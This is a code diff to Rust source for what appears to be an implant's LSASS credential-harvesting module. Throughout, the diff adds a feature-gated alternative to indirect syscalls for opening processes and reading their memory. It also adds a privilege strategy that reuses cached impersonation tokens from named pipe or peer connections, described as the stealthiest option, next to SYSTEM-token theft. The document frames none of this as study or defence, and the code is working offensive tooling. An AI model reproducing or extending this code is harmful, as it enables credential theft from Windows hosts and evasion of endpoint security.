@@ -116,7 +116,11 @@ unsafe fn nt_query_system_information(
     )
 }
 
-/// Call `NtOpenProcess` via indirect syscall.
+/// Call `NtOpenProcess` via emulation-aware path.
+///
+/// When the `syscall-emulation` feature is compiled in and enabled, this
+/// routes through the kernel32 `OpenProcess` fallback.  Otherwise it
+/// uses the existing indirect syscall via `nt_syscall`.
 unsafe fn nt_open_process(
     pid: u32,
     desired_access: u32,
@@ -130,23 +134,41 @@ unsafe fn nt_open_process(
     let mut cid: CLIENT_ID = std::mem::zeroed();
     cid.UniqueProcess = pid as *mut _;
 
-    let target = nt_syscall::get_syscall_id("NtOpenProcess")
-        .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;
-    let status = nt_syscall::do_syscall(
-        target.ssn,
-        target.gadget_addr,
-        &[
+    #[cfg(all(windows, feature = "syscall-emulation"))]
+    {
+        let status = crate::syscall_emulation::emulate_nt_open_process(
             &mut handle as *mut _ as u64,
             desired_access as u64,
             &mut oa as *mut _ as u64,
             &mut cid as *mut _ as u64,
-        ],
-    );
+        );
+        match status {
+            Ok(s) if nt_success(s) => Ok(handle),
+            Ok(s) => Err(anyhow!("NtOpenProcess(PID={pid}) failed: 0x{s:08X}")),
+            Err(e) => Err(anyhow!("NtOpenProcess(PID={pid}) emulation error: {e}")),
+        }
+    }
 
-    if !nt_success(status) {
-        Err(anyhow!("NtOpenProcess(PID={pid}) failed: 0x{status:08X}"))
-    } else {
-        Ok(handle)
+    #[cfg(not(all(windows, feature = "syscall-emulation")))]
+    {
+        let target = nt_syscall::get_syscall_id("NtOpenProcess")
+            .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;
+        let status = nt_syscall::do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[
+                &mut handle as *mut _ as u64,
+                desired_access as u64,
+                &mut oa as *mut _ as u64,
+                &mut cid as *mut _ as u64,
+            ],
+        );
+
+        if !nt_success(status) {
+            Err(anyhow!("NtOpenProcess(PID={pid}) failed: 0x{status:08X}"))
+        } else {
+            Ok(handle)
+        }
     }
 }
 
@@ -182,69 +204,130 @@ unsafe fn nt_duplicate_object(
     }
 }
 
-/// Call `NtQueryVirtualMemory(MemoryBasicInformation)` via indirect syscall.
+/// Call `NtQueryVirtualMemory(MemoryBasicInformation)` via emulation-aware path.
+///
+/// When the `syscall-emulation` feature is compiled in and enabled, this
+/// routes through the kernel32 `VirtualQueryEx` fallback.  Otherwise it
+/// uses the existing indirect syscall via `nt_syscall`.
 unsafe fn nt_query_virtual_memory(
     process: HANDLE,
     base_address: usize,
 ) -> Option<MemoryBasicInfo> {
     let mut mbi: MemoryBasicInfo = std::mem::zeroed();
-    let target = nt_syscall::get_syscall_id("NtQueryVirtualMemory").ok()?;
-    let status = nt_syscall::do_syscall(
-        target.ssn,
-        target.gadget_addr,
-        &[
+
+    #[cfg(all(windows, feature = "syscall-emulation"))]
+    {
+        let status = crate::syscall_emulation::emulate_nt_query_virtual_memory(
             process as u64,
             base_address as u64,
-            MEMORY_BASIC_INFORMATION as u64,
+            0u64, // MemoryBasicInformation
             &mut mbi as *mut _ as u64,
             std::mem::size_of::<MemoryBasicInfo>() as u64,
             0u64, // ReturnLength
-        ],
-    );
-    if nt_success(status) {
-        Some(mbi)
-    } else {
-        None
+        );
+        match status {
+            Ok(s) if nt_success(s) => Some(mbi),
+            _ => None,
+        }
+    }
+
+    #[cfg(not(all(windows, feature = "syscall-emulation")))]
+    {
+        let target = nt_syscall::get_syscall_id("NtQueryVirtualMemory").ok()?;
+        let status = nt_syscall::do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[
+                process as u64,
+                base_address as u64,
+                0u64, // MemoryBasicInformation
+                &mut mbi as *mut _ as u64,
+                std::mem::size_of::<MemoryBasicInfo>() as u64,
+                0u64, // ReturnLength
+            ],
+        );
+        if nt_success(status) {
+            Some(mbi)
+        } else {
+            None
+        }
     }
 }
 
-/// Call `NtReadVirtualMemory` via indirect syscall.
+/// Call `NtReadVirtualMemory` via emulation-aware path.
+///
+/// When the `syscall-emulation` feature is compiled in and enabled, this
+/// routes through the kernel32 `ReadProcessMemory` fallback.  Otherwise it
+/// uses the existing indirect syscall via `nt_syscall`.
 unsafe fn nt_read_virtual_memory(
     process: HANDLE,
     base_address: usize,
     buffer: &mut [u8],
 ) -> Result<usize> {
     let mut bytes_read: usize = 0;
-    let target = nt_syscall::get_syscall_id("NtReadVirtualMemory")
-        .map_err(|e| anyhow!("NtReadVirtualMemory SSN resolution: {e}"))?;
-    let status = nt_syscall::do_syscall(
-        target.ssn,
-        target.gadget_addr,
-        &[
+
+    #[cfg(all(windows, feature = "syscall-emulation"))]
+    {
+        let status = crate::syscall_emulation::emulate_nt_read_virtual_memory(
             process as u64,
             base_address as u64,
             buffer.as_mut_ptr() as u64,
             buffer.len() as u64,
             &mut bytes_read as *mut _ as u64,
-        ],
-    );
+        );
+        match status {
+            Ok(s) if nt_success(s) => Ok(bytes_read),
+            Ok(s) => Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{s:08X}", base_address)),
+            Err(e) => Err(anyhow!("NtReadVirtualMemory({:#x}) emulation error: {e}", base_address)),
+        }
+    }
 
-    if !nt_success(status) {
-        Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{status:08X}", base_address))
-    } else {
-        Ok(bytes_read)
+    #[cfg(not(all(windows, feature = "syscall-emulation")))]
+    {
+        let target = nt_syscall::get_syscall_id("NtReadVirtualMemory")
+            .map_err(|e| anyhow!("NtReadVirtualMemory SSN resolution: {e}"))?;
+        let status = nt_syscall::do_syscall(
+            target.ssn,
+            target.gadget_addr,
+            &[
+                process as u64,
+                base_address as u64,
+                buffer.as_mut_ptr() as u64,
+                buffer.len() as u64,
+                &mut bytes_read as *mut _ as u64,
+            ],
+        );
+
+        if !nt_success(status) {
+            Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{status:08X}", base_address))
+        } else {
+            Ok(bytes_read)
+        }
     }
 }
 
-/// Close a kernel handle via `NtClose` indirect syscall.
+/// Close a kernel handle via emulation-aware path.
+///
+/// When the `syscall-emulation` feature is compiled in and enabled, this
+/// routes through the kernel32 `CloseHandle` fallback.  Otherwise it
+/// uses the existing indirect syscall via `nt_syscall`.
 fn nt_close(handle: HANDLE) {
     if handle.is_null() {
         return;
     }
-    if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
-        let _ = unsafe {
-            nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle as u64])
-        };
+
+    #[cfg(all(windows, feature = "syscall-emulation"))]
+    {
+        let _ = crate::syscall_emulation::emulate_nt_close(handle as u64);
+    }
+
+    #[cfg(not(all(windows, feature = "syscall-emulation")))]
+    {
+        if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
+            let _ = unsafe {
+                nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle as u64])
+            };
+        }
     }
 }
 
@@ -553,12 +636,44 @@ struct PrivilegeContext {
     debug_priv_enabled_by_us: bool,
     /// Whether we stole a SYSTEM token (and should revert via Rev2Self).
     stole_system_token: bool,
+    /// Whether we applied a cached impersonation token from the
+    /// token_impersonation module.
+    used_impersonation_cache: bool,
 }
 
 /// Enable SeDebugPrivilege via the token manipulation module.
 /// Returns Ok(true) if the privilege was already enabled, Ok(false) if we had
 /// to enable it.  Returns Err if privilege escalation fails entirely.
 fn prepare_privileges() -> Result<PrivilegeContext> {
+    // ── Strategy 0: token_impersonation cached token ──────────────
+    // If the token_impersonation module has a cached privileged token
+    // (e.g. from a named pipe client or P2P peer), apply it first.
+    // This is the stealthiest option — no new token theft is required.
+    #[cfg(all(windows, feature = "token-impersonation"))]
+    {
+        if crate::token_impersonation::is_enabled() {
+            if let Some(_token) = crate::token_impersonation::get_cached_token() {
+                match crate::token_impersonation::apply_cached_token(None) {
+                    Ok(()) => {
+                        log::debug!(
+                            "lsass_harvest: applied cached impersonation token for LSASS access"
+                        );
+                        return Ok(PrivilegeContext {
+                            debug_priv_enabled_by_us: false,
+                            stole_system_token: false,
+                            used_impersonation_cache: true,
+                        });
+                    }
+                    Err(e) => {
+                        log::debug!(
+                            "lsass_harvest: cached token apply failed, falling back: {e:#}"
+                        );
+                    }
+                }
+            }
+        }
+    }
+
     // Try SeDebugPrivilege first using the existing token manipulation module.
     // The token_manipulation module exposes get_system() which can elevate us.
     // For SeDebugPrivilege specifically, we adjust the current process token.
@@ -566,6 +681,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
         Ok(already_enabled) => Ok(PrivilegeContext {
             debug_priv_enabled_by_us: !already_enabled,
             stole_system_token: false,
+            used_impersonation_cache: false,
         }),
         Err(_) => {
             // Fall back: steal a SYSTEM token.
@@ -575,6 +691,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
             Ok(PrivilegeContext {
                 debug_priv_enabled_by_us: false,
                 stole_system_token: true,
+                used_impersonation_cache: false,
             })
         }
     }
@@ -678,6 +795,13 @@ fn enable_debug_privilege() -> Result<bool> {
 
 /// Revert privilege changes.
 fn revert_privileges(ctx: &PrivilegeContext) {
+    // If we applied a cached impersonation token, auto-revert handles it
+    // if configured, otherwise we revert via the token_impersonation module.
+    #[cfg(all(windows, feature = "token-impersonation"))]
+    if ctx.used_impersonation_cache && !crate::token_impersonation::auto_revert_enabled() {
+        let _ = crate::token_impersonation::revert_token();
+    }
+
     if ctx.stole_system_token {
         let _ = crate::token_manipulation::rev2self();
     }
